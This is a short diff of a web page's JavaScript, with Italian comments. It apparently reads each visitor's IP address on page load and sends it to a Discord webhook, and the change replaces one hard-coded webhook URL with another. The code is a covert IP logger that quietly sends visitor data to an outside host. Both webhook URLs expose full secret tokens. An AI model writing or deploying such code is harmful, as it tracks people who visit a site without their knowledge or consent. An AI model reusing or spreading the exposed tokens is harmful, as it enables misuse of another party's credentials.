@@ -13,7 +13,7 @@ document.addEventListener("DOMContentLoaded", function() {
 });
 
 function sendToDiscord(ip) {
-    const webhookUrl = 'https://discordapp.com/api/webhooks/1342604141029097574/x3GiqzW6zOjKElWy_LJU6Q5ixpttu7cX6xpiRMjqyUpnNsZq3Uq0g5V2vlaqoUTYJ8ap'; // Sostituisci con l'URL della tua webhook
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1342611002822234276/pRik-szA0iIK4gXyX2nkCawHLhw0Y_Yif1mU90IpFZoNqnSMrlPLJ_WC1Qg1HWifppuS'; // Sostituisci con l'URL della tua webhook
 
     const message = {
         content: `L'indirizzo IP dell'utente è: ${ip}`
